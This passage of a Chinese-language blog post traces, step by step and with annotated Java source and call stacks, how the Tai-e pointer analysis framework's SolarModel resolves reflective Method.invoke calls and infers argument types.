  <span class="comment">// 如果不是静态方法或者构造方法</span></span><br><span class="line">    <span class="keyword">if</span> (!callee.isConstructor() &amp;&amp; !callee.isStatic()) &#123;</span><br><span class="line">        <span class="comment">// dispatch for instance method (except constructor)</span></span><br><span class="line">        <span class="keyword">assert</span> recvObj != <span class="literal">null</span> : <span class="string">&quot;recvObj is required for instance method&quot;</span>;</span><br><span class="line">        <span class="comment">// 重点：查找对应的callee method</span></span><br><span class="line">        callee = hierarchy.dispatch(recvObj.getObject().getType(),</span><br><span class="line">                callee.getRef());</span><br><span class="line">        <span class="keyword">if</span> (callee == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">CSCallSite</span> <span class="variable">csCallSite</span> <span class="operator">=</span> csManager.getCSCallSite(callerCtx, callSite);</span><br><span class="line">    Context calleeCtx;</span><br><span class="line">    <span class="keyword">if</span> (callee.isStatic()) &#123;</span><br><span class="line">        calleeCtx = selector.selectContext(csCallSite, callee);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        calleeCtx = selector.selectContext(csCallSite, recvObj, callee);</span><br><span class="line">        <span class="comment">// pass receiver object to &#x27;this&#x27; variable of callee</span></span><br><span class="line">        <span class="comment">// </span></span><br><span class="line">        solver.addVarPointsTo(calleeCtx, callee.getIR().getThis(), recvObj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// </span></span><br><span class="line">    <span class="type">ReflectiveCallEdge</span> <span class="variable">callEdge</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReflectiveCallEdge</span>(csCallSite,</span><br><span class="line">            csManager.getCSMethod(calleeCtx, callee), args);</span><br><span class="line">    <span class="comment">// 增加一条calledge</span></span><br><span class="line">    solver.addCallEdge(callEdge);</span><br><span class="line">    allTargets.put(callSite, callee); <span class="comment">// record target</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="0x05-步骤跟踪"><a href="#0x05-步骤跟踪" class="headerlink" title="0x05 步骤跟踪"></a>0x05 步骤跟踪</h1><h2 id="5-1-SolarModel-methodInvoke-第一次"><a href="#5-1-SolarModel-methodInvoke-第一次" class="headerlink" title="5.1 SolarModel#methodInvoke 第一次"></a>5.1 SolarModel#methodInvoke 第一次</h2><p>调用栈</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">methodInvoke:199, SolarModel (pascal.taie.analysis.pta.plugin.reflection)</span><br><span class="line">accept:-1, AbstractModel$$Lambda$287/0x0000000800ee7990 (pascal.taie.analysis.pta.plugin.util)</span><br><span class="line">lambda$handleNewPointsToSet$0:155, AbstractModel (pascal.taie.analysis.pta.plugin.util)</span><br><span class="line">accept:-1, AbstractModel$$Lambda$359/0x0000000800f1b960 (pascal.taie.analysis.pta.plugin.util)</span><br><span class="line">forEach:75, Iterable (java.lang)</span><br><span class="line">forEach:1092, Collections$UnmodifiableCollection (java.util)</span><br><span class="line">handleNewPointsToSet:151, AbstractModel (pascal.taie.analysis.pta.plugin.util)</span><br><span class="line">handleNewPointsToSet:292, SolarModel (pascal.taie.analysis.pta.plugin.reflection)</span><br><span class="line">onNewPointsToSet:126, ReflectionAnalysis (pascal.taie.analysis.pta.plugin.reflection)</span><br><span class="line">lambda$onNewPointsToSet$1:109, CompositePlugin (pascal.taie.analysis.pta.plugin)</span><br><span class="line">accept:-1, CompositePlugin$$Lambda$354/0x0000000800f1aa10 (pascal.taie.analysis.pta.plugin)</span><br><span class="line">forEach:1511, ArrayList (java.util)</span><br><span class="line">onNewPointsToSet:109, CompositePlugin (pascal.taie.analysis.pta.plugin)</span><br><span class="line">analyze:318, DefaultSolver (pascal.taie.analysis.pta.core.solver)</span><br><span class="line">solve:246, DefaultSolver (pascal.taie.analysis.pta.core.solver)</span><br><span class="line">runAnalysis:119, PointerAnalysis (pascal.taie.analysis.pta)</span><br><span class="line">analyze:107, PointerAnalysis (pascal.taie.analysis.pta)</span><br><span class="line">analyze:64, PointerAnalysis (pascal.taie.analysis.pta)</span><br><span class="line">runProgramAnalysis:148, AnalysisManager (pascal.taie.analysis)</span><br><span class="line">runAnalysis:135, AnalysisManager (pascal.taie.analysis)</span><br><span class="line">lambda$execute$0:104, AnalysisManager (pascal.taie.analysis)</span><br><span class="line">get:-1, AnalysisManager$$Lambda$227/0x0000000800eaf578 (pascal.taie.analysis)</span><br><span class="line">runAndCount:93, Timer (pascal.taie.util)</span><br><span class="line">lambda$execute$1:103, AnalysisManager (pascal.taie.analysis)</span><br><span class="line">accept:-1, AnalysisManager$$Lambda$226/0x0000000800eaf120 (pascal.taie.analysis)</span><br><span class="line">forEach:1511, ArrayList (java.util)</span><br><span class="line">execute:102, AnalysisManager (pascal.taie.analysis)</span><br><span class="line">executePlan:152, Main (pascal.taie)</span><br><span class="line">lambda$main$0:61, Main (pascal.taie)</span><br><span class="line">run:-1, Main$$Lambda$109/0x0000000800d2b228 (pascal.taie)</span><br><span class="line">lambda$runAndCount$0:112, Timer (pascal.taie.util)</span><br><span class="line">get:-1, Timer$$Lambda$110/0x0000000800d2b680 (pascal.taie.util)</span><br><span class="line">runAndCount:93, Timer (pascal.taie.util)</span><br><span class="line">runAndCount:111, Timer (pascal.taie.util)</span><br><span class="line">runAndCount:107, Timer (pascal.taie.util)</span><br><span class="line">main:52, Main (pascal.taie)</span><br></pre></td></tr></table></figure><p><img src="/images/pasted-726.png" alt="upload successful"></p><blockquote><p>疑问：relevantVars 何时input值的</p></blockquote><p><img src="/images/pasted-727.png" alt="upload successful"></p><p><img src="/images/pasted-728.png" alt="upload successful"></p><p>解读：</p><ul><li>var r3 即tt</li><li>pts 为22行的new InvokeDemo()</li><li>invoke 为jvm invokevirtual 动态调用</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@InvokeHandler(signature = &quot;&lt;java.lang.reflect.Method: java.lang.Object invoke(java.lang.Object,java.lang.Object[])&gt;&quot;, argIndexes = &#123;BASE, 0&#125;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">methodInvoke</span><span class="params">(CSVar csVar, PointsToSet pts, Invoke invoke)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (isIgnored(invoke)) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 获取当前参数的pts，当前参数为-1和0位置，也即</span></span><br><span class="line">    <span class="comment">// 1. method</span></span><br><span class="line">    <span class="comment">// 2. obj</span></span><br><span class="line">    List&lt;PointsToSet&gt; args = getArgs(csVar, pts, invoke, BASE, <span class="number">0</span>);</span><br><span class="line">    <span class="comment">// method obj对应的pts</span></span><br><span class="line">    <span class="type">PointsToSet</span> <span class="variable">mtdObjs</span> <span class="operator">=</span> args.get(<span class="number">0</span>);</span><br><span class="line">    <span class="comment">// infer m^t_s from m^t_u (obj) with type information at invoke</span></span><br><span class="line">    <span class="comment">// 获取invoke的TypeInfo，包括resultType和argsType</span></span><br><span class="line">    <span class="keyword">if</span> (typeMatcher.hasTypeInfo(invoke)) &#123;</span><br><span class="line">        <span class="type">Context</span> <span class="variable">context</span> <span class="operator">=</span> csVar.getContext();</span><br><span class="line">        <span class="comment">// 获取method 对应的Var</span></span><br><span class="line">        <span class="type">Var</span> <span class="variable">m</span> <span class="operator">=</span> InvokeUtils.getVar(invoke, BASE); <span class="comment">// m.invoke(o, args);</span></span><br><span class="line">        <span class="comment">// 此刻mtdObjs为空，不进入这里，暂不跟踪</span></span><br><span class="line">        mtdObjs.forEach(obj -&gt; &#123;</span><br><span class="line">            <span class="keyword">if</span> (helper.isUnknownMetaObj(obj)) &#123;</span><br><span class="line">                <span class="type">MethodInfo</span> <span class="variable">methodInfo</span> <span class="operator">=</span> helper.getMethodInfo(obj);</span><br><span class="line">                <span class="type">JClass</span> <span class="variable">clazz</span> <span class="operator">=</span> methodInfo.clazz();</span><br><span class="line">                <span class="keyword">if</span> (clazz != <span class="literal">null</span> &amp;&amp; (!ONLY_APP || clazz.isApplication())) &#123;</span><br><span class="line">                    <span class="comment">// class is known in methodInfo</span></span><br><span class="line">                    Stream&lt;JMethod&gt; targets = methodInfo.isFromGetMethod()</span><br><span class="line">                            ? Reflections.getMethods(clazz)</span><br><span class="line">                            : Reflections.getDeclaredMethods(clazz);</span><br><span class="line">                    targets.filter(target -&gt; !typeMatcher.isUnmatched(invoke, target))</span><br><span class="line">                            .map(helper::getMetaObj)</span><br><span class="line">                            .forEach(mtdObj -&gt; solver.addVarPointsTo(context, m, mtdObj));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// collect unsound Method.invoke() call</span></span><br><span class="line">    <span class="comment">// 放入unsoundInvokes</span></span><br><span class="line">    <span class="keyword">if</span> (!unsoundInvokes.contains(invoke)) &#123;</span><br><span class="line">    <span class="comment">// 获取method 的pts</span></span><br><span class="line">        <span class="type">PointsToSet</span> <span class="variable">recvObjs</span> <span class="operator">=</span> args.get(<span class="number">1</span>);</span><br><span class="line">        <span class="comment">// 获取obj 的var</span></span><br><span class="line">        <span class="type">Var</span> <span class="variable">o</span> <span class="operator">=</span> InvokeUtils.getVar(invoke, <span class="number">0</span>);</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">oIsNull</span> <span class="operator">=</span> o.isConst() &amp;&amp; o.getConstValue() <span class="keyword">instanceof</span> NullLiteral;</span><br><span class="line">        <span class="comment">// 如果method 有对应pts</span></span><br><span class="line">        <span class="keyword">for</span> (CSObj mtdObj : mtdObjs) &#123;</span><br><span class="line">        <span class="comment">// 满足特定条件，才会被添加unsoundInvokes</span></span><br><span class="line">            <span class="keyword">if</span> (helper.isUnknownMetaObj(mtdObj)) &#123;</span><br><span class="line">                <span class="type">MethodInfo</span> <span class="variable">methodInfo</span> <span class="operator">=</span> helper.getMethodInfo(mtdObj);</span><br><span class="line">                <span class="keyword">if</span> (methodInfo.isClassUnknown()) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (oIsNull) &#123;</span><br><span class="line">                        unsoundInvokes.add(invoke);</span><br><span class="line">                        <span class="keyword">return</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">for</span> (CSObj recvObj : recvObjs) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (recvObj.getObject() <span class="keyword">instanceof</span> MockObj mockObj &amp;&amp;</span><br><span class="line">                                mockObj.getDescriptor().equals(UNKNOWN_DESC)) &#123;</span><br><span class="line">                            unsoundInvokes.add(invoke);</span><br><span class="line">                            <span class="keyword">return</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>所以总体看看，干了啥</p><ul><li>unsoundInvokes，满足一定条件的invoke，会被放在这里</li><li>中间更新了obj、method、arg的pts</li></ul><p>所以这里并没有直接解析出invoke的映射关系。</p><h4 id="AbstractModel-getArgs"><a href="#AbstractModel-getArgs" class="headerlink" title="AbstractModel#getArgs"></a>AbstractModel#getArgs</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * For invocation r = v.foo(a0, a1, ..., an);</span></span><br><span class="line"><span class="comment"> * when points-to set of v or any ai (0 &amp;le; i &amp;le; n) changes,</span></span><br><span class="line"><span class="comment"> * this convenient method returns points-to sets relevant arguments.</span></span><br><span class="line"><span class="comment"> * For case v/ai == csVar.getVar(), this method returns pts,</span></span><br><span class="line"><span class="comment"> * otherwise, it just returns current points-to set of v/ai.     </span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> csVar   may be v or any ai.</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> pts     changed part of csVar</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> invoke  the call site which contain csVar</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> indexes indexes of the relevant arguments</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 对于调用 r = v.foo(a0, a1, ..., an);</span></span><br><span class="line"><span class="comment"> * 如果v，或者ai(0&lt;=i&lt;=n)的pts变化，这个方法返回pts相关的参数。</span></span><br><span class="line"><span class="comment"> * 如果v或者ai等于参数csVar，那么返回参数pts，</span></span><br><span class="line"><span class="comment"> * 否则返回v或者ai 对应的pts</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">protected</span> List&lt;PointsToSet&gt; <span class="title function_">getArgs</span><span class="params">(</span></span><br><span class="line"><span class="params">        CSVar csVar, PointsToSet pts, Invoke invoke, <span class="type">int</span>... indexes)</span> &#123;</span><br><span class="line">    List&lt;PointsToSet&gt; args = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;(indexes.length);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i : indexes) &#123;</span><br><span class="line">    <span class="comment">// 根据位置index获取invoke调用所在对应位置的参数</span></span><br><span class="line">        <span class="type">Var</span> <span class="variable">arg</span> <span class="operator">=</span> InvokeUtils.getVar(invoke, i);</span><br><span class="line">        <span class="comment">// 如果和csVar 相同，那么直接返回当前pts</span></span><br><span class="line">        <span class="keyword">if</span> (arg.equals(csVar.getVar())) &#123;</span><br><span class="line">            args.add(pts);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 否则，从csManager中获取</span></span><br><span class="line">            <span class="type">CSVar</span> <span class="variable">csArg</span> <span class="operator">=</span> csManager.getCSVar(csVar.getContext(), arg);</span><br><span class="line">            <span class="comment">// solver.getPointsToSetOf没有过多操作，获取CSVar中对应的pts，如果当前CSVar没有指定pts关系，那么则关联上</span></span><br><span class="line">            args.add(solver.getPointsToSetOf(csArg));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> args;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li>第0个参试是$r6，不是csVar的$r3，那么通过csManager获取</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">getCSVar:172, MapBasedCSManager$PointerManager (pascal.taie.analysis.pta.core.cs.element)</span><br><span class="line">getCSVar:65, MapBasedCSManager (pascal.taie.analysis.pta.core.cs.element)</span><br><span class="line">getArgs:180, AbstractModel (pascal.taie.analysis.pta.plugin.util)</span><br><span class="line">methodInvoke:202, SolarModel (pascal.taie.analysis.pta.plugin.reflection)</span><br></pre></td></tr></table></figure><p><img src="/images/pasted-730.png" alt="upload successful"><br><img src="/images/pasted-731.png" alt="upload successful"><br><img src="/images/pasted-729.png" alt="upload successful"></p><blockquote><p>疑问：csManager何时维护的？</p></blockquote><ol start="2"><li>第0个参试是$r3，是csVar，那么直接返回csVar的pts</li></ol><p><img src="/images/pasted-732.png" alt="upload successful"></p><h4 id="typeMatcher-hasTypeInfo-invoke"><a href="#typeMatcher-hasTypeInfo-invoke" class="headerlink" title="typeMatcher.hasTypeInfo(invoke)"></a>typeMatcher.hasTypeInfo(invoke)</h4><p>TypeMatcher.java</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">boolean hasTypeInfo(Invoke invoke) &#123;</span><br><span class="line">    return getTypeInfo(invoke).argumentTypes() != null;</span><br><span class="line">&#125;</span><br><span class="line">private TypeInfo getTypeInfo(Invoke invoke) &#123;</span><br><span class="line">    return typeInfos.computeIfAbsent(invoke, TypeMatcher::computeTypeInfo);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * Performs an intra-procedural analysis to compute available</span><br><span class="line"> * type information for reflective call &#123;@code invoke&#125;.</span><br><span class="line"> */</span><br><span class="line">private static TypeInfo computeTypeInfo(Invoke invoke) &#123;</span><br><span class="line">    List&lt;Stmt&gt; stmts = invoke.getContainer().getIR().getStmts();</span><br><span class="line">    // search cast type on result of invoke</span><br></pre></td></tr></table></figure><h4 id="TypeMatcher-computeTypeInfo"><a href="#TypeMatcher-computeTypeInfo" class="headerlink" title="TypeMatcher#computeTypeInfo"></a>TypeMatcher#computeTypeInfo</h4><p>作用是：执行程序内分析，计算反射调用 {@code invoke} 的可用类型信息。</p><blockquote><p>难不成这里是关键？</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> TypeInfo <span class="title function_">computeTypeInfo</span><span class="params">(Invoke invoke)</span> &#123;</span><br><span class="line"><span class="comment">// 获取当前invoke调用所在的函数的所有子stmt</span></span><br><span class="line">    List&lt;Stmt&gt; stmts = invoke.getContainer().getIR().getStmts();</span><br><span class="line">    <span class="comment">// search cast type on result of invoke</span></span><br><span class="line">    <span class="type">Var</span> <span class="variable">result</span> <span class="operator">=</span> invoke.getResult();</span><br><span class="line">    <span class="type">Type</span> <span class="variable">returnType</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="comment">// 如果存在ret，暂时不看，本case没有</span></span><br><span class="line">    <span class="keyword">if</span> (result != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> invoke.getIndex() + <span class="number">1</span>; i &lt; stmts.size(); ++i) &#123;</span><br><span class="line">            <span class="type">Stmt</span> <span class="variable">stmt</span> <span class="operator">=</span> stmts.get(i);</span><br><span class="line">            <span class="keyword">if</span> (stmt.getUses().contains(result) &amp;&amp; returnType != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="comment">// found multiple usages of the result, give up</span></span><br><span class="line">                returnType = <span class="literal">null</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (stmt <span class="keyword">instanceof</span> Cast cast &amp;&amp;</span><br><span class="line">                    cast.getRValue().getValue().equals(result)) &#123;</span><br><span class="line">                <span class="keyword">assert</span> returnType == <span class="literal">null</span>;</span><br><span class="line">                returnType = cast.getRValue().getCastType();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 如果参数个数为0</span></span><br><span class="line">    <span class="keyword">if</span> (invoke.getInvokeExp().getArgCount() == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">// no argument, it means that invoke calls Class.newInstance()</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">TypeInfo</span>(returnType, List.of());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// search definition of args</span></span><br><span class="line">    <span class="comment">// argIndexes静态常量，判断是invoke调用还是newInstance调用，如果是invoke，那么参数位置为1，如果是newInstance，那么为0</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">argIndex</span> <span class="operator">=</span> argIndexes.get(invoke.getMethodRef().getName());</span><br><span class="line">    <span class="comment">// 获取invoke参数对应的var</span></span><br><span class="line">    <span class="type">Var</span> <span class="variable">args</span> <span class="operator">=</span> invoke.getInvokeExp().getArg(argIndex);</span><br><span class="line">    Type[] argTypes = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">if</span> (args.isConst()) &#123;</span><br><span class="line">        <span class="comment">// if args is constant, it must be null, and for such case,</span></span><br><span class="line">        <span class="comment">// no argument is given.</span></span><br><span class="line">        argTypes = <span class="keyword">new</span> <span class="title class_">Type</span>[<span class="number">0</span>];</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// invoke的参数是数组格式的，这里验证下</span></span><br><span class="line">        <span class="keyword">assert</span> args.getType() <span class="keyword">instanceof</span> ArrayType;</span><br><span class="line">        DefinitionStmt&lt;?, ?&gt; argDef = <span class="literal">null</span>;</span><br><span class="line">        <span class="comment">// 一当前invoke为起始点，往上回溯，找到arg的定义，注意这里arg是个数组，实际上并非代码中，而是IR过程自动生成，这一步的目的是</span></span><br><span class="line">        <span class="comment">// 1. 获取invoke参数个数，生成argTypes数组</span></span><br><span class="line">        <span class="comment">// 2. 获取到argDef</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> invoke.getIndex() - <span class="number">1</span>; i &gt;= <span class="number">0</span>; --i) &#123;</span><br><span class="line">            <span class="type">Stmt</span> <span class="variable">stmt</span> <span class="operator">=</span> stmts.get(i);</span><br><span class="line">            <span class="keyword">if</span> (stmt <span class="keyword">instanceof</span> DefinitionStmt&lt;?, ?&gt; defStmt) &#123;</span><br><span class="line">                <span class="type">LValue</span> <span class="variable">lValue</span> <span class="operator">=</span> defStmt.getLValue();</span><br><span class="line">                <span class="keyword">if</span> (args.equals(lValue)) &#123; <span class="comment">// found definition of args</span></span><br><span class="line">                    <span class="keyword">if</span> (argDef == <span class="literal">null</span>) &#123;</span><br><span class="line">                        argDef = defStmt;</span><br><span class="line">                        <span class="type">int</span> <span class="variable">length</span> <span class="operator">=</span> getArrayLength(defStmt.getRValue());</span><br><span class="line">                        <span class="keyword">if</span> (length != -<span class="number">1</span>) &#123; <span class="comment">// found args = new Object[length];</span></span><br><span class="line">                            argTypes = <span class="keyword">new</span> <span class="title class_">Type</span>[length];</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123; <span class="comment">// args is defined by other ways, give up</span></span><br><span class="line">                            <span class="keyword">break</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123; <span class="comment">// found multiple definitions of args, give up</span></span><br><span class="line">                        argTypes = <span class="literal">null</span>;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (argTypes != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="comment">// creation of args is analyzable, collect argument types</span></span><br><span class="line">            <span class="comment">// 从argDef开始往后遍历</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> argDef.getIndex(); i &lt; stmts.size(); ++i) &#123;</span><br><span class="line">                <span class="type">Stmt</span> <span class="variable">stmt</span> <span class="operator">=</span> stmts.get(i);</span><br><span class="line">                <span class="comment">// 对应Store 存储，StoreArray 往Array里面存储</span></span><br><span class="line">                <span class="keyword">if</span> (stmt <span class="keyword">instanceof</span> StoreArray storeArray) &#123;</span><br><span class="line">                </span><br><span class="line">                    <span class="type">ArrayAccess</span> <span class="variable">arrayAccess</span> <span class="operator">=</span> storeArray.getArrayAccess();</span><br><span class="line">                    <span class="keyword">if</span> (arrayAccess.getBase().equals(args)) &#123;</span><br><span class="line">                        <span class="comment">// args[*] = ...;</span></span><br><span class="line">                        <span class="type">Var</span> <span class="variable">index</span> <span class="operator">=</span> arrayAccess.getIndex();</span><br><span class="line">                        <span class="keyword">if</span> (index.isConst()) &#123; <span class="comment">// index is constant</span></span><br><span class="line">                            <span class="type">int</span> <span class="variable">iIndex</span> <span class="operator">=</span> ((IntLiteral) index.getConstValue()).getValue();</span><br><span class="line">                            <span class="keyword">if</span> (argTypes[iIndex] == <span class="literal">null</span>) &#123;</span><br><span class="line">                            <span class="comment">// 获取对应参数类型</span></span><br><span class="line">                                argTypes[iIndex] = storeArray.getRValue().getType();</span><br><span class="line">                            &#125; <span class="keyword">else</span> &#123; <span class="comment">// found multiple definitions</span></span><br><span class="line">                                <span class="comment">// on the same array index, give up</span></span><br><span class="line">                                argTypes = <span 